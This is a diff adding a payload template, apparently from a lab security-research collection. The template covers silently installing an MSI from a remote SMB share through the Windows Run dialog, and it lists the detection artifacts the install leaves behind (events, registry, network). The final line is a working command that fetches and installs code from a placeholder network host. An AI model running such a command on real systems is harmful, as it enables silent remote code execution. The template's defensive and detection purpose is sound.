@@ -1,0 +1,24 @@
+# TEMPLATE: msiexec-001
+# CLASS: msiexec UNC .msi install (staged, Run dialog, no local file)
+# AUTHORIZATION: Authorized lab security research only — see payloads/README.md.
+#   SMB_HOST must be a lab placeholder (RFC1918 10.x, example-only).
+# PURPOSE: Install a staged MSI directly from a UNC path so nothing is
+#   written to the target before the Windows Installer service starts.
+#   The Run dialog resolves \\SMB_HOST\... via ShellExecute, so no cmd
+#   wrapper is needed and no quoting is required.
+# PREREQUISITES: SMB (TCP 445) from the target VM to SMB_HOST reachable and
+#   SMB_SHARE readable; MSI_NAME is a lab-built benign installer. Silent
+#   install (/qn) may be blocked for unsigned MSIs under some policies —
+#   swap to /qb- for a visible UI in the lab if needed.
+# CLEANUP: Uninstall the product (msiexec /x <product-code> or /x
+#   \\SMB_HOST\<SMB_SHARE>\<MSI_NAME>); clear Run MRU.
+# ARTIFACT: Process: msiexec.exe spawned by explorer.exe (Run dialog),
+#   plus the msiexec service-side instance; custom actions run under it.
+# ARTIFACT: Eventlog: Application log MsiInstaller events
+#   (11707 install-success, 11708 install-failure, 1035/1036 product state).
+# ARTIFACT: Network: SMB2 session to SMB_HOST over TCP 445; .msi file read.
+# ARTIFACT: Registry: RunMRU value contains the full UNC command;
+#   installed product writes its own HKLM Uninstall keys.
+# ARTIFACT: Filesystem: files laid down by the MSI under the install dir.
+# ---
+msiexec /i \\<SMB_HOST>\<SMB_SHARE>\<MSI_NAME> /qn
